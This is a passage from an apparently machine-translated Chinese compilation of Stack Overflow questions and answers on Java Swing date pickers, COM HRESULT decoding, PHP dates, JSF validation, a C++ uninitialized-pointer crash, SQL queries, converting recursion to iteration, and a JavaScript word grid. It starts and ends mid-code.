                    numBtn.setBackground(palletTableColor);
                    numBtn.setForeground(dateFontColor);
                    numBtn.addActionListener(new ActionListener() {
                        public void actionPerformed(ActionEvent event) {
                            JButton source = (JButton) event.getSource();
                            if (source.getText().length() == 0) {
                                return;
                            }
                            dayColorUpdate(true);
                            source.setForeground(todayBackColor);
                            int newDay = Integer.parseInt(source.getText());
                            Calendar cal = getCalendar();
                            cal.set(Calendar.DAY_OF_MONTH, newDay);
                            setDate(cal.getTime());

                            dateDialog.setVisible(false);
                        }
                    });

                    if (j == 0 || j == 6)
                        numBtn.setForeground(weekendFontColor);
                    else
                        numBtn.setForeground(dateFontColor);
                    daysButton[i][j] = numBtn;
                    panel.add(numBtn);
                    actionCommandId++;
                }

            return panel;
        }

        private Calendar getCalendar() {
            Calendar calendar = Calendar.getInstance();
            calendar.setTime(getDate());
            return calendar;
        }

        private int getSelectedYear() {
            return ((Integer) yearSpin.getValue()).intValue();
        }

        private int getSelectedMonth() {
            return ((Integer) monthSpin.getValue()).intValue();
        }

        private void dayColorUpdate(boolean isOldDay) {
            Calendar cal = getCalendar();
            int day = cal.get(Calendar.DAY_OF_MONTH);
            cal.set(Calendar.DAY_OF_MONTH, 1);
            int actionCommandId = day - 2 + cal.get(Calendar.DAY_OF_WEEK);
            int i = actionCommandId / 7;
            int j = actionCommandId % 7;
            if (isOldDay) {
                daysButton[i][j].setForeground(dateFontColor);
            } else {
                daysButton[i][j].setForeground(todayBackColor);
            }
        }

        private void reflushWeekAndDay() {
            Calendar cal = getCalendar();
            cal.set(Calendar.DAY_OF_MONTH, 1);
            int maxDayNo = cal.getActualMaximum(Calendar.DAY_OF_MONTH);
            int dayNo = 2 - cal.get(Calendar.DAY_OF_WEEK);
            for (int i = 0; i < 6; i++) {
                for (int j = 0; j < 7; j++) {
                    String s = "";
                    if (dayNo >= 1 && dayNo <= maxDayNo) {
                        s = String.valueOf(dayNo);
                    }
                    daysButton[i][j].setText(s);
                    dayNo++;
                }
            }
            dayColorUpdate(false);
        }

        public void stateChanged(ChangeEvent e) {
            dayColorUpdate(true);

            JSpinner source = (JSpinner) e.getSource();
            Calendar cal = getCalendar();
            if (source.getName().equals("Year")) {
                cal.set(Calendar.YEAR, getSelectedYear());
            } else {
                cal.set(Calendar.MONTH, getSelectedMonth() - 1);
            }
            setDate(cal.getTime());
            reflushWeekAndDay();
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-04-26T19:06:49.017

LGoodDatePicker[库](https://github.com/LGoodDatePicker/LGoodDatePicker)包括一个（摆动）**DatePicker**组件，它允许用户从日历中选择日期。（默认情况下，用户也可以从键盘输入日期，但如果需要，可以禁用键盘输入）。DatePicker 具有自动数据验证功能，这意味着（除其他外）用户输入的任何日期都将始终转换为您想要的日期格式。

公平披露：我是主要开发人员。

由于 DatePicker 是一个摇摆组件，您可以将它添加到任何其他摇摆容器中，包括（在您的场景中）JTable 的单元格。

自动支持最常用的日期格式，如果需要，可以添加其他日期格式。

要强制执行所需的日期格式，您很可能希望将所选格式设置为 DatePicker 的默认“显示格式”。可以使用 Java 8 [DateTimeFormatter Patterns](https://docs.oracle.com/javase/8/docs/api/java/time/format/DateTimeFormatter.html)指定格式。无论用户键入（或单击）什么，只要用户完成，日期总是会转换为指定的格式。

除了 DatePicker 之外，该库还具有 TimePicker 和 DateTimePicker 组件。我在下面粘贴了所有组件（和演示程序）的屏幕截图。

该库可以从项目[发布页面](https://github.com/LGoodDatePicker/LGoodDatePicker/releases)安装到您的 Java 项目中。

项目主页位于 Github 上：
[https](https://github.com/LGoodDatePicker/LGoodDatePicker) ://github.com/LGoodDatePicker/LGoodDatePicker 。

![日期时间选择器截图](../Images/f9ba38e6777e3cb6d03bac173edbded2.png)

![日期时间选择器示例](../Images/64f8ab15621314df3a0ab6eb7aff0904.png)

![演示截图](../Images/8ed5a482056dbf2374e55bbd19ccca92.png)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-12-13T09:32:44.207

Netbeans 中的另一种简单方法也可以在这里使用，Netbeans 本身内部有库，其中提供了针对此类情况的解决方案。也选择相关的。它更容易。按照链接中的规定步骤完成后，请重新启动 Netbeans。

```
Step1:- Select Tools->Palette->Swing/AWT Components
Step2:- Click 'Add from JAR'in Palette Manager
Step3:- Browse to [NETBEANS HOME]\ide\modules\ext and select swingx-0.9.5.jar
Step4:- This will bring up a list of all the components available for the palette.  Lots of goodies here!  Select JXDatePicker.
Step5:- Select Swing Controls & click finish
Step6:- Restart NetBeans IDE and see the magic :) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T09:35:24.103

1.  打开您的 Java 源代码文档并导航到您在 Swing 类中创建的 JTable 对象。

2.  创建一个包含 DatePickerTable 的新 TableModel 对象。您必须使用 MMDDYYYY 格式的日期值范围创建 DatePickerTable。第一个值是开始日期，最后一个值是结束日期。在代码中，这看起来像：

    ```
    TableModel datePicker = new DatePickerTable("01011999","12302000"); 
    ```

3.  在 datePicker 对象中设置显示间隔。默认情况下会显示每一天，但您可以设置一个固定的时间间隔。要在日期选项之间设置 15 天的间隔，请使用以下代码：

    ```
    datePicker.interval = 15; 
    ```

4.  将您的表格模型附加到您的 JTable 中：

    ```
    JTable newtable = new JTable (datePicker); 
    ```

    您的 Java 应用程序现在有一个下拉日期选择对话框。

# c++ - 如何破译 COM 函数返回的 hr 返回值“-1072875847”？

> ID：11736881
> 
> 赞同：0
> 
> 时间：2012-07-31T09:20:51.707
> 
> 标签：c++, visual-c++, com, return-value, ms-media-foundation

我正在使用 VC++。COM 函数返回的 hr 返回值为“ **-1072875847** ”。任何人都可以让我知道如何将 hr 值解读为它们的实际含义。具体来说“-1072875847”代表什么？

预先感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:27:54.523

这些代码是[`HRESULT`](http://msdn.microsoft.com/en-us/library/bb446131.aspx)值，最好以十六进制读取。这个是`0xC00D36B9`，这是媒体基础错误“一个对象用完了媒体类型来建议，因此请求的流对象链无法完成。” ( [`MF_E_NO_MORE_TYPES`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd206746%28v=vs.85%29.aspx))。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T01:07:08.080

这应该可以解决问题，

```
std::cout << "Error: " << std::hex << hrStatus << std::endl; 
```

你需要去头文件 mferror.h 并搜索它。或者谷歌它。祝你好运

# php - PHP 和或 mysql：从一些变量中确定日期

> ID：11736883
> 
> 赞同：0
> 
> 时间：2012-07-31T09:21:02.717
> 
> 标签：php, mysql

假设我在 php 中有两个变量：

```
$year
$month 
```

然后我想制作另一个变量：

```
$date 
```

哪个：

```
$date=$year-$month-25 
```

因此，如果我在 $year 中有 2012 年，在 $month 中有 7 年，则 $date 将是 2012-07-25。

实际上，我会将它与 MySQL 中的某个日期进行比较。$year 和 $month 由用户输入。

有人有解决方案吗？解决方案是如何制作 $date 或任何可以与 mysql 中的日期进行比较的东西。之前谢谢。^^

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:28:33.497

您可以通过以下方式制作 unix 时间戳：

```
$myDate = mktime(0, 0, 0, $month, 25, $year); 
```

这是一个非常有用的东西，因为您可以通过以下方式将其格式化为各种漂亮的东西：

```
echo date("Y-m-d", $myDate);
// Prints something like: 2012-07-25 
```

或者

```
echo date("l", $myDate);
// Prints something like: Monday 
```

或者

```
date('l jS \of F Y h:i:s A', $myDate);
// Prints something like: Monday 8th of August 2005 03:12:46 PM 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:24:15.587

您可以执行以下操作

```
$complete_date = $year."-".$month."-25"; 
```

这给了你 2012-7-25

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:26:19.643

请阅读“ [php 手册](http://php.net/manual/en/language.operators.string.php)”以连接您的 PHP 字符串。

它不是

```
$date = $year-$month-25; 
```

这是

```
$date = $year . '-' . $month . '- 25'; 
```

或者

```
$date = $year . "-" . $month . "- 25"; 
```

但简单的引用更适合 php 字符串。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T09:27:25.743

> 解决方案是如何制作 $date 或任何东西，只要它可以与 mysql 中的日期进行比较

这里的关键是使用`strtotime`创建和比较。

MySQL 日期可以通过使用 strototime 转换为整数：

```
strtotime($mysql_date); 
```

然后你可以得到`time()`并比较两个：

```
time()<>strtotime($mysql_date) // then the two dates are not equal. 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T09:27:55.663

您可以使用 mktime 功能

```
$date = date('Y-m-d',mktime(0,0,0,$month,25,$year)); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-31T09:28:15.803

好吧，我会使用 mktime 来获取日期的时间戳（[http://php.net/manual/de/function.mktime.php](http://php.net/manual/de/function.mktime.php)）并在 mysql 中使用命令 unix_timestamp(date(yourfield)) 来比较它们。（仅当您保存日期时间值而不是纯日期值时才需要带有 unix_timestamp 的 date()）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-07-31T09:34:46.737

由于默认情况下mysql日期通常采用这种格式`Y-m-d`，因此您可以使用

```
$thedate = date('Y-m-d',mktime(0,0,0,$month,25,$year));
```

其中`$month`和`$year`基于用户输入。当然，您必须使用选择/列表让用户以您想要的格式输入它。

# validation - 来自模型级验证的用户友好消息

> ID：11736885
> 
> 赞同：0
> 
> 时间：2012-07-31T09:21:05.823
> 
> 标签：validation, jsf-2

我目前正在研究在 glassfish 上运行的 JSF 2 应用程序（带有 primefaces）。我们的数据模型是一个标准（AIXM），所以我们不能修改它。验证规则在模型上定义。

在我们的应用程序中，gui 并不完全反映模型。例如，模型中的某些字段不显示（它们是根据用户输入计算的）。该模型还有一个 ConditionCombination 类，它允许表达对象列表之间的逻辑关系。在我们的应用程序中，我们只使用了这些对象列表中的 2 个。所以我们计算了ConditionCombination的一些属性。

由于我们有跨字段验证（使用 JSF 验证机制似乎很难做到），我们选择在模型级别进行验证。但是某些错误消息对用户没有意义。例如，某些错误消息位于不向用户显示的字段上。

关于如何改进此验证有什么想法吗？（或者我们应该在 JSF 级别实现它，并将所有验证规则从模型透视图重写为视图透视图）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T10:01:57.647

您可以使用`FacesContext context = FacesContext.getCurrentInstance(); context.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, "Your message here", null));`

只需在模型中编写代码并为自定义消息附加上面的代码。

# c++ - 程序崩溃

> ID：11736888
> 
> 赞同：0
> 
> 时间：2012-07-31T09:21:09.570
> 
> 标签：c++

我是编程新手。请帮我解决这个问题。

当我执行这个程序时，程序会崩溃。谁能告诉我坠机的确切原因？

```
#include<stdio.h>    
#include<string.h>    
#include<vector>    
using namespace std;    

struct s  
{  
    char *str;  
};  

std::vector<struct s> v;  
int main()  
{  
    struct s s1;  
    strcpy(s1.str,"hi");  
    v.push_back(s1);  
    strcpy(s1.str,"hello");  
    v.push_back(s1);  
    strcpy(s1.str,"How are you");  
    v.push_back(s1);  
    strcpy(s1.str,"AMAZING");  
    v.push_back(s1);  
    for (int i=0;i<(int)v.size();i++)  
    {           
        printf("%s\n",v[i].str);  
    }  
    return 0;  
} 
```

我正在用 devc++ 编译它。请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:23:12.747

没有分配内存`str`并且[违反了三个规则](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)`struct s`：使用代替。[`std::string`](http://en.cppreference.com/w/cpp/string/basic_string)

`struct s`声明类型时不需要指定（在 C 中） `s`，只需使用`s`：

```
std::vector<s> v;

s s1; 
```

您可以`struct s`通过提供构造函数来更方便地使用：

```
struct s
{
    s(const std::string& a_s) : str(a_s) {}
    std::string str;
};

v.push_back(s("hi")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:25:36.303

您还没有分配任何内存`s1.str`来指向。您正在通过一个未定义的指针编写，给出未定义的行为。

尝试类似：

```
struct s { 
    std::string str;
};

s s1;

s1.str = "hi";
v.push_back(s1);
// etc. 
```

更好的是，直接使用一个字符串和一个 C++11 初始化列表：

```
std::vector<std::string> v{"hi", "hello", "how are you", "AMAZING"};

std::copy(v.begin(), v.end(), std::ostream_iterator<std::string>(std::cout, "\n")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:22:17.743

您没有`char *str;`在结构中分配内存

看看`strcpy`文档：[http ://www.cplusplus.com/reference/clibrary/cstring/strcpy/](http://www.cplusplus.com/reference/clibrary/cstring/strcpy/)

必须分配要复制的内存。但是当你写：

```
char *str; 
```

内存未分配。您刚刚创建了一个指针（指向垃圾）

您可以分配内存或更好地使用`std::string`，因为在这种情况下将为您完成内存管理。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T09:22:52.280

您没有在`s.str`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T09:23:45.600

您正在经历未定义的行为。你`char * str`只是一个指针，没有分配内存。然而，您尝试修改它指向的内存。由于该内存不属于您的程序，因此您将崩溃。

由于它是UB，您无法真正说出*会*发生什么。例如，对我来说，这段代码运行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T09:26:56.800

您需要在使用它之前为 s1 分配内存（未初始化的指针指向垃圾）.. 使用`new`它一旦完成不要忘记使用`delete`运算符释放内存..

我建议你看看一些好的 C++ 教程，

1.  [看到这个链接](http://www.cprogramming.com/tutorial.html)
2.  [另一个不错的 C++ 资源](http://www.cpp4u.com/c++/tutorial/beginner.html)

**注意**我已经编辑（更改）了这个答案，因为所有其他人的答案都正确解决了这个问题。我只是想给他们加几分钱。

# whm - WHMCS 促销代码的每个客户端验证一次

> ID：11736891
> 
> 赞同：0
> 
> 时间：2012-07-31T09:21:27.287
> 
> 标签：whm, whmcs

我正在使用 WHMCS API 并且我已经创建了促销活动，对于我的促销活动之一，需要激活 onceperclient 设置。但是我怎样才能在后端检查它..？我怎么知道客户是否已经申请了促销..？有什么建议么 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T23:15:27.780

如果您可以访问您的数据库——例如 phpmyadmin，您可以检查您的数据库表中的模块/插件数据字段，它们会向您显示使用您的促销活动的客户列表。它可能有他们的用户名 email ，其值包含**0**表示**not active**和**1**表示**active**。

那是我首先要开始的地方。

# php - SQL SELECT查询同一字段中的两个值

> ID：11736895
> 
> 赞同：0
> 
> 时间：2012-07-31T09:21:36.857
> 
> 标签：php, sql

我对 SQL 查询相当陌生，并且在对已经运行的数据库执行查询时遇到了麻烦。

我需要运行两个查询，首先检查谁在 3 天前注册并且没有下任何订单并且没有收到给他们提供报价的电子邮件。这很好用。

下一个查询是检查客户是否在 7 天前注册，没有下任何订单并收到 3 天的电子邮件。我可以做到这一点，但我还需要检查他们是否还没有收到第二封电子邮件，这是让我感到困惑的部分。即使当我再次运行查询时向客户发送了 2 封电子邮件，它们仍然会出现。

```
$sql = "
    SELECT c.customerID, c.email, c.forename, c.date 
      FROM customers c
       LEFT OUTER JOIN orders_headers o ON o.customerID=c.customerID 
       LEFT OUTER JOIN no_order_mail_sent m ON m.customerID=c.customerID 
       LEFT OUTER JOIN automated_email_discount e ON e.customerID=c.customerID 
     WHERE m.customerID IS NULL
       AND o.customerID IS NULL
       AND e.customerID IS NOT NULL 
       AND e.discount_code_id='1'
       AND e.discount_code_id!='2' 
       AND STR_TO_DATE(c.date, '%Y%m%d') ='".date('Y-m-d', strtotime('-'.$days.'days'))."'
"; 
```

两个折扣代码是第一封电子邮件的 1（5% 折扣）和第二封电子邮件（10% 的折扣）的 2，这是我要检查的数据库中的值。

我在 PHP 中运行查询。任何帮助将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:47:17.643

从查询中排除“LEFT OUTER JOIN automatic_email_discount”和该表的条件并添加以下条件：

```
And c.customerID not in (select customerID from automated_email_discount where discount_code_id='2') 
```

这是最后的声明：

```
SELECT c.customerID, c.email, c.forename, c.date 
      FROM customers c
       LEFT OUTER JOIN orders_headers o ON o.customerID=c.customerID 
       LEFT OUTER JOIN no_order_mail_sent m ON m.customerID=c.customerID 
     WHERE m.customerID IS NULL
       AND o.customerID IS NULL
       And c.customerID not in (select customerID from automated_email_discount where discount_code_id='2')
       AND STR_TO_DATE(c.date, '%Y%m%d') ='".date('Y-m-d', strtotime('-'.$days.'days'))."'
"; 
```

# c - 在将非尾递归函数转换为迭代函数时处理它的尾部分

> ID：11736898
> 
> 赞同：2
> 
> 时间：2012-07-31T09:21:46.367
> 
> 标签：c, algorithm, methods, methodology

使用您自己制作的堆栈将非尾递归函数转换为迭代函数时，处理递归调用（即尾）之后的代码部分的一般方法是什么？

以下函数应该探索迷宫中所有可能的路径，重新访问预先访问的路径以访问堆栈中的其他路径：

```
struct node{
    int id;
    bool free;
    int neighborNode[4];
    int toProcess;
} nodeMap[100];

void findPath(int current){
    visited[current] = true;
    int i;
    for (i=0; i < 4; i++){
       if(nodeMap[nodeMap[current].neighborNode[i]].free == true && visited[nodeMap[current].neighborNode[i]] == false && nodeMap[current].neighborNode[i] != -1){
        path[cc] = nodeMap[nodeMap[current].neighborNode[i]].id;
        cc++;
        findPath(nodeMap[current].neighborNode[i]);
        path[cc] = nodeMap[current].id;
        cc++;
        }
    }
} 
```

代码的递归部分很容易转换为迭代（我使用了一个字段`toProcess`来模拟循环的索引，因为它没有保存在堆栈中并且是处理所有子项所必需的）：

```
void findPath(){
    if (isEmpty())
        return;
    else {
        node temp = pop();
        visited[temp.id] = true;
        if (temp.toProcess < 3) {
            temp.toProcess++;
            push(temp);
            temp.toProcess--;
        }
        if(nodeMap[temp.neighborNode[temp.toProcess]].free == true && visited[temp.neighborNode[temp.toProcess]] == false && temp.neighborNode[temp.toProcess] != -1){
            path[cc] = nodeMap[temp.neighborNode[temp.toProcess]].id;
            cc++;
            push(nodeMap[temp.neighborNode[temp.toProcess]]);
        }
    }
} 
```

但是算法向后移动以重新访问以前看到的节点以探索其他可能的路径（尾部）的部分，即`path[cc] = nodeMap[current].id;`&`cc++;`似乎不适合该方法的迭代版本！有一个通用的方法吗？还是每个案例都不一样？无论如何，你有什么建议如何在这种情况下实现尾部？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:27:36.597

堆栈解决方案使用尾递归函数既好又简单，但就像在您的示例中一样，由于您在递归调用之后执行某些操作，因此您需要找出在调用结束后执行这些操作的方法。

以下是一个可能的解决方案：

```
struct stack_element
{
    ... your_stuff...
    bool expanded;
}; 
```

在代码中：

```
stack_element e;
... fill e
e.expanded = false;
push(e);
while (!empty())
{
    e = pop();
    if (e.expanded)
    {
        ... do the stuff that was supposed to be done
        ... after e and all its children are processed
    }
    else
    {
        e.expanded = true;
        push(e);               // push e, so it would be visited again
                               // once all children are processed
        for (every child of e)
            if (they met the conditions)
            {
                ... do the stuff before
                stack_element child;
                ... fill child
                child.expanded = false;
                push(child);
            }
    }
} 
```

这基本上做的是，访问每个节点两次。一次在展开时，此时您在递归调用*之前*执行这些东西，另一次在它的所有子级完成处理后，此时您在递归调用*之后执行这些东西。*

请注意，您可能需要保存一些状态，例如可能`cc`和`current`与节点一起保存，以便您能够`if (e.expanded)`正确执行该部分。

* * *

侧面建议：使用`for`循环，就像你在递归方法中所做的那样，这比使用`toProcess`.

* * *

在您的情况下，对孩子的一个分支执行会影响访问或不访问其他孩子，您可以遵循以下方法：

每次得到一个节点，检查它是否满足必要条件。如果是，则在调用该节点之前进行处理。然后像以前一样，再次推送它，以便再次访问它并完成后处理。这样，每次你只是推孩子，然后再决定他们好不好：

```
struct stack_element
{
    ... your_stuff...
    bool expanded;
    ... save also cc, current and i
};

stack_element e;
... fill e
e.expanded = false;
push(e);
while (!empty())
{
    e = pop();
    if (e.expanded)
    {
        ... do the stuff that was supposed to be done
        ... when function called with e is returning and
        ... after the function returns to parent
    }
    else if (conditions for are met)
    {
        ... do the stuff that was supposed to be done before
        ... e is recursively called and at the beginning of the
        ... function
        e.expanded = true;
        push(e);               // push e, so it would be visited again
                               // once all children are processed
        for (every child of e, in reverse order)
        {
            stack_element child;
            ... fill child
            child.expanded = false;
            push(child);
        }
    }
} 
```

* * *

查看确切代码后，这是转换后的版本：

```
struct stacknode{
    int id;
    int parent;
    bool free;
    bool expanded;
};

int cc = 0;

void findPath2(int current){

    // special case for the first call:
    visited[current] = true;

    // expand the first node, because when the first node is popped,
    // there was no "stuff before recursion" before it.
    int i;
    for (i=3; i >= 0; --i){
        // Put the neighbors on the stack so they would be inspected:
        stacknode child;
        child.id = nodeMap[current].neighborNode[i];
        child.parent = current;
        child.free = nodeMap[child.id].free;
        child.expanded = false;
        push(child);
    }

    while (!isEmpty())
    {
        stacknode cur = pop();
        if (cur.expanded == true)
        {
            // Now, it's like a return from a recursive function
            // Note: cur.id will be nodeMap[current].neighborNode[i] because that was the value the function was called with
            // Stuff at the end of the function:
            path[0]=current;    // Note: this is kind of absurd, it keeps getting overwritten!
            // Stuff after recursion:
            cc++;  // note that path[0] is reserved for first node, so you should first increment cc, then set path[cc]
            path[cc] = nodeMap[cur.parent].id;  // nodeMap[current].id: current was the parent of
                                // nodeMap[current].neighborNode[i] for which the function was called
        }
        else
        {
            // Now, it's like when the recursive function is called (including stuff before recursion)
            // Note: cur.id will be nodeMap[current].neighborNode[i] because that was the value the function was called with
            // Check whether child was supposed to be added:
            if(cur.id != -1 && nodeMap[cur.id].free == true && visited[cur.id] == false)
                // Node: Put cur.id != -1 in the beginning. Otherwise, you would possibly check
                // nodeMap[-1] and visited[-1] which is not nice
            {
                cur.expanded = true;
                push(cur);
                // Stuff before recursion:
                cc++;
                path[cc] = nodeMap[cur.id].id;      // in cur.id, nodeMap[current].neighborNode[i] was stored
                // Stuff at the beginning of function call:
                visited[cur.id] = true;
                // The body of the function:
                for (i=3; i >= 0; --i){
                    // Put the neighbors on the stack so they would be inspected:
                    stacknode child;
                    child.id = nodeMap[cur.id].neighborNode[i];
                    child.parent = cur.id;
                    child.free = nodeMap[child.id].free;
                    child.expanded = false;
                    push(child);
                }
            }
        }
    }
    // end of special case for first call:
    path[0] = current;
} 
```

* * *

请注意，它开始变得复杂的原因是它的存在`cc`是一个全局变量。如果您有一个不使用全局变量的递归函数，那么转换会更简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T11:52:49.920

将递归转换为迭代的一般方法是使用一种*事件循环*，该循环从堆栈中重复弹出事件并执行其处理程序。我将首先编写一些类似于您的递归函数的伪代码，以便更容易理解转换：

```
recurse (node)
{
    for (i = 0; i < 4; i++) {
        if (condition(node, i)) {
            recurse(next_node(node, i));
        }
    }
} 
```

我们现在要做的是将这个递归函数拆分为一系列操作 - 但是，我们没有明确地编写它，而是将每个操作定义为一个事件及其对应的事件处理程序，以防在此操作之后还有更多工作要做，处理程序将在执行其操作之前将此进一步的工作*推送到堆栈。*

```
my_iterative_function ()
{
    // build the event stack and push the initial event
    EventStack stack;
    stack.push(NewRecurseEvent(node = first_node));

    // pop and execute events
    while (!stack.isEmpty()) {
        Event ev = stack.pop();
        ev.executeHandler();
    }
}

RecurseEventHandler (node)
{
    // We are at the beginning of the "recurse" function.
    // Push iteration 0 (we could optimize this and just do it here).
    stack.push(NewIterationEvent(node = node, i = 0));
}

IterationEventHandler (node, i)
{
    // Unless this is the last iteration, push the next iteration
    // to be executed after this iteration is complete. It will work
    // with the same node, but 'i' one greater.
    if (i < 3) {
        stack.push(NewIterationEvent(node = node, i = i + 1));
    }

    // do the work of this iteration
    if (condition(node, i)) {
        # Initiate the recursion by pushing.
        # It is crutial to understand that the event loop will pop this event,
        # and all events pushed by it, recursively, before
        # popping the continuation event we pushed above.
        # That is, it will behave just like the recursive variant.
        stack.push(NewRecurseEvent(node = next_node(node, i)));
    }
} 
```

这取决于语言如何实际实现此伪代码。在 C 中，事件对象可以是一个标记的联合，它包含各种事件处理程序的参数，您可以让事件循环直接执行事件处理程序操作：

```
struct event {
    int type; // RECURSE_EVENT or ITERATION_EVENT
    union {
        struct {
            node node;
        } recurse_event;
        struct {
            node node;
            int i;
        } iteration_event;
    };
};

while (!stack.isEmpty()) {
    struct event ev = stack.pop();
    switch (ev.type) {
        case RECURSE_EVENT: {
            node n = ev.recurse_event.node;
            ...
        } break;
        case ITERATION_EVENT: {
            node n = ev.iteration_event.node;
            int i = ev.iteration_event.i;
            ...
        } break;
    }
} 
```

由于递归调用后面的部分，您的实际递归函数比我的简单示例更复杂，因此您将需要更多事件来处理它。例如，您可以添加另一种事件来处理后递归步骤：

```
IterationEventHandler (node, i)
{
    if (i < 3) {
        stack.push(NewIterationEvent(node = node, i = i + 1));
    }

    if (condition(node, i)) {
        // This PostEvent will be executed after the recursive work,
        // but before the next iteration pushed above.
        stack.push(NewPostEvent(node = node, i = i));
        stack.push(NewRecurseEvent(node = next_node(node, i)));
    }
}

PostEventHandler (node, i)
{
    // do your post-recursion work here
} 
```

如果您考虑到，在查看单个事件处理程序时，很容易理解这一点，*所有工作都将按照它被推送的相反顺序执行*。例如，在`IterationEventHandler`上面，首先将执行递归，然后是后递归步骤，最后将开始下一个迭代步骤（如果有的话）。用更简单的术语来说，每次*推送*都可以理解为一个可能递归的函数调用，只不过这些调用是自下而上执行的。

请注意，这是一种通用方法。可能构建一个编译器，将任何递归函数转换为这样的事件循环。此外，这种方法不仅是将递归转换为迭代的优雅方式；“堆栈事件循环”的想法在事件驱动软件的设计中非常实用，特别是如果您还能够将已推送但尚未执行的事件出列。我已经在对[这个问题](https://stackoverflow.com/questions/10064229/c-force-stack-unwinding-inside-function)的回答中解释了这一点。

# javascript - 让循环在我的脚本中工作

> ID：11736900
> 
> 赞同：0
> 
> 时间：2012-07-31T09:22:01.033
> 
> 标签：javascript, jquery

我基本上希望这个循环在我正在开发的网格中产生随机空间，但不能让它在我的脚本中工作。

我有正确的循环我只是无法让它与我的脚本的其余部分一起工作

我刚刚编辑了它仍然不起作用，还有其他想法吗？

```
 var listOfWords = {};

var ul = document.getElementById("wordlist");

var i;
for(i = 0; i < ul.children.length; ++i){
   listOfWords[ul.children[i].getAttribute("data-word")] = {
         "pic" : ul.children[i].getAttribute("data-pic"),
         "audio" : ul.children[i].getAttribute("data-audio")
   };
} 

console.log(listOfWords);

var chosenWords = new Array();

      for(var x = 0; x < 6; x++)
    {
        var rand = Math.floor(Math.random() * (listOfWords.length+1));
        chosenWords.push(listOfWords[rand]);
         if (chosenWords.length < 12){
                    chosenWords.push('  ');   
          }

    }

var shuffledWords = Object.keys(listOfWords).slice(0).sort(function() {
    return 0.5 - Math.random();
}).slice(0, 6);
var guesses = {};
console.log(shuffledWords);
var tbl = document.createElement('table');
tbl.className = 'tablestyle';
 var wordsPerRow = 2;

for (var i = 0; i < Object.keys(shuffledWords).length - 1; i += wordsPerRow) {
    var row = document.createElement('tr');

    for (var j = i; j < i + wordsPerRow; ++j) {
        var word = shuffledWords[j];
        guesses[word] = [];

        for (var k = 0; k < word.length; ++k) {
            var cell = document.createElement('td');

            $(cell).addClass('drop').attr('data-word', word);
            cell.textContent = word[k];

            row.appendChild(cell);
           }
    }
    tbl.appendChild(row);
}

document.body.appendChild(tbl); 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:22:06.993

首先你应该改变：

```
 If(chosenWords.length < 12){ 
```

至 ：

```
 if (chosenWords.length < 12) { 
```

和 ：

```
 chosenWords.push(“  ”); 
```

至 ：

```
 chosenWords.push(' '); 
```

并定义变量 selectedWords。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T12:35:06.057

希望这对您有所帮助：

```
var listOfWords = [];

var ul = document.getElementById("wordlist");

var i;
for(i = 0; i < ul.children.length; ++i){

   listOfWords.push({
         "name"   : ul.children[i].getAttribute("data-word"),
         "pic"    : ul.children[i].getAttribute("data-pic"),
         "audio"  : ul.children[i].getAttribute("data-audio")
   });

    console.log(listOfWords);
}

console.log(listOfWords);

var chosenWords = [];
var cpy_list = listOfWords.slice();

      for(var x = 0; x < 6; x++)
    {
        var rand = Math.floor(Math.random() * (cpy_list.length));
        console.log('push ' + cpy_list[rand].name);
        chosenWords.push(cpy_list[rand].name);
        cpy_list.splice(rand,1);
        console.log(cpy_list);  
        if (chosenWords.length < 12){
            console.log('make a blanck' );
                    chosenWords.push('   ');   
          }

    }

console.log(chosenWords);
var shuffledWords = [];
 shuffledWords = chosenWords.sort(function() { return 0.5 - Math.random() });

var guesses = {};
console.log(shuffledWords);
var tbl = document.createElement('table');
tbl.className = 'tablestyle';
var wordsPerRow = 2;

for (var i = 0; i < shuffledWords.length - 1; i += wordsPerRow) {

    var row = document.createElement('tr');
    console.log(shuffledWords);
    for (var j = i; j < i + wordsPerRow; ++j) {
        var word = shuffledWords[j];
        console.log(j);
        console.log(word);
        guesses[word] = [];

        for (var k = 0; k < word.length; ++k) {
            var cell = document.createElement('td');

            $(cell).addClass('drop').attr('data-word', word);
            cell.textContent = word[k];

            row.appendChild(cell);
        }
    }
    tbl.appendChild(row);
}

document.body.appendChild(tbl);

$('#pickNext').click(function() {
    // remove the class from all td's
    $('td').removeClass('spellword');
    // pick a random word
    rndWord = Math.floor(Math.random() * (listOfWords.length));
    // apply class to all cells containing a letter from that word
    $('td[data-word="' + listOfWords[rndWord].name + '"]').addClass('spellword');
});

$('.drag').draggable({

    helper: 'clone',
    snap: '.drop',
    grid: [60, 60],
    revert: 'invalid',
    snapMode: 'corner'
});

$('.drop').droppable ({
    drop: function(event, ui) {
        word = $(this).data('word');

        guesses[word].push($(ui.draggable).attr('data-letter'));
        console.log($(event));
        console.log($(ui.draggable).text());

